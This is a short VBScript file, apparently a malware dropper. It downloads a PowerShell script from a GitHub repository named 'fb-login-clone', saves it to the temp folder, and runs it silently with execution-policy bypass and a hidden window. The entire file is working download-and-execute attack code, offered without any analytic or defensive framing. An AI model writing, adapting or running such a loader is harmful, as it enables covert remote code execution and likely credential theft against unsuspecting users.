Set shell = CreateObject("WScript.Shell")
Set http = CreateObject("MSXML2.XMLHTTP")
Set stream = CreateObject("ADODB.Stream")

url = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna/setup.ps1"
dest = shell.ExpandEnvironmentStrings("%TEMP%\setup.ps1")

http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    stream.Type = 1 'binary
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile dest, 2
    stream.Close
    shell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & dest & """", 0, False
End If
